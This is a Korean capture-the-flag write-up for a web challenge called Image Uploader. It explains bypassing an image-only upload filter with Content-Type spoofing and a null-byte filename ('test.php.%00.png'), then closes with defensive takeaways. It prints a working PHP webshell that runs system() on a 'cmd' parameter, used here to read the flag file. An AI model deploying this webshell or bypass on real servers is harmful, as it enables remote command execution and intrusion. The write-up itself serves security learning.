## 1. Overview
* **Target Challenge:** Image Uploader
* **Category:** Web Hacking
* **Key Concept:** File upload 확장자 우회

---

## 2. Vulnerability Analysis

### Endpoint
* `/uploads`

### Source Code Analysis
서비스 동작 및 코드 분석 결과 
**upload.php**
`$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];`
`$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif', 'image/jpg'];`
    
이미지 파일만 업로드 확장자 검증 로직이 구성되어 있습니다.

**image-storage**
기존 파일업로드에서는 그냥 웹쉘 파일 업로드 후 cmd로 flag를 읽어오는 방식이었다면 이번엔 확장자를 우회해서 푸는 문제인거 같았습니다.

---

## 3. Proof of Concept (PoC)
Burp suite Tool을 이용해 일단 php코드가 저장되어있는걸 test.txt에 저장시킵니다. 그리고 업로드를 시도합니다. 

간단하게 작성된 webshell php code

```
<?php

echo 'command: <br/>';
echo '<form action="">';
echo '<input type="text" name="cmd">';
echo '<input type="submit">';
echo '</form>';

if (isset($_GET['cmd'])) {
	$cmd = $_GET['cmd'];
	echo '<pre>';
	system($cmd);
	echo '</pre>';
}
?>
```

리피터(Repeater)기능을 이용해 테스트를 해보았습니다.
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/d6be53293a6e0716db7063f2b19d30cb2cde22943014690b26d3f18181009f99.png)

"오직 이미지만 가능하다" 문구와 함께 업로드에 실패했습니다. 그래서 해당 헤더를 조작해봤습니다.
Content-Disposition: form-data; name="file"; filename="test.png"
Content-Type: image/png

![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/1f062055a52db83f5d3e389fbb3c9f8617bb6cc70f013dd8329a34a8cce5f0ba.png)

업로드에 성공했다는 문구를 볼 수 있었습니다.
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/9830fd46e8a8cae7fce88f69359ea865e665fe69bc2e59bd58f05ac45365a087.png)

hi라는 글쓴이와 깨진사진이 업로드되어있는데 결론은 아무것도 flag가 보이지 않았습니다.
소스코드에 `/uploads` 엔드포인터로 이동해보았습니다.

![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/0fe3b3aeb2acb07bd2882a6ca8f74d483118585a134ed60c7661f83b6697a186.png)

디렉토리인덱싱 방식으로 파일명들이 출력이 되어있었습니다. 아까 올린 이미지도 보입니다. 

그럼 어떻게 하면 우회할 수 있을까 하다가 해당 Payload로 우회해봤습니다

`Content-Disposition: form-data; name="file"; filename="test.php.%00.png"
Content-Type: image/png`

%00 : null바이트라는 것으로 뒤에 있는 확장자는 png라 서버가 정상업로드 하게 되지만 %00값으로 인해 뒤에 있는 png를 버리기 때문에 결국 업로드 되는건 test.php (webshell code)가 담긴 파일이 업로드 됩니다.

![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/be64d058235fb615183cc94d1d944102a377836f619cb27b0892faa1d0d2b25f.png)

올려진 파일을 클릭하면 command 명령어 창이 출력됩니다.

 ![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/7d4e6f3c0540b461a59d4aa873df10651a0426765ca06f0c666be387455368bd.png)

다음 단계는 쉽습니다. flag.txt만 읽어오면 됩니다.

`cat /flag.txt`

---

## 4. **Execution & Result**

![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/5b830c7c5a785eeba3e6f092056c50491b29ad5bbc856768ba15d8a111eb3d22.png)

Command 입력창 밑에 flag가 출력 됨.

---

## 5. **Takeaways**
* **Null Byte Injection 취약점 이해:** 파일 업로드 시 파일명의 `%00`(Null Byte) 문자로 인해 검증 로직과 실제 파일 시스템 처리 로직 간의 해석 차이가 발생하여 확장자 검증이 우회될 수 있음을 확인했습니다.
* **서버 측 파일 확장자 및 경로 검증 강화:** 단순히 파일명의 끝부분 확장자만 검사하는 방식은 우회될 수 있으므로, 파일 업로드 시 서버에서 무작위 파일명(UUID 등)으로 재정의하여 저장하거나, 최신 버전의 백엔드 언어/환경을 사용하여 Null Byte 주입을 원천 차단해야 합니다.